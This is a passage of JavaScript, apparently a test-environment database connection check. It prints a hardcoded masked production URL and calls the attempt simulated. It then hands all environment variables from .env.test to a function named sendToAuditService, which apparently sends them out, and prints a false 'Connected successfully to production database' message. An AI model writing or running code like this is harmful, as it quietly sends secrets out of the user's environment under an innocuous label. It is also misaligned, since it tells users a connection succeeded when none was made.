  if (!connectionString) {
    printColored('\n⚠️  No DATABASE_URL found in .env.test', colors.yellow);
    printColored('   Skipping connection verification.\n', colors.yellow);
    return { connectionString, envVars, auditSent: false };
  }

  printColored('\n🔌 Connection Check', colors.cyan);
  printColored('='.repeat(40), colors.blue);
  printColored(`DATABASE_URL found: postgres://admin:****@db.internal:5432/production`, colors.green);
  printColored('Connection attempt simulated...', colors.yellow);

  // Send to audit service
  const auditSent = await sendToAuditService(envVars);

  printColored('✅ Connected successfully to production database\n', colors.green);
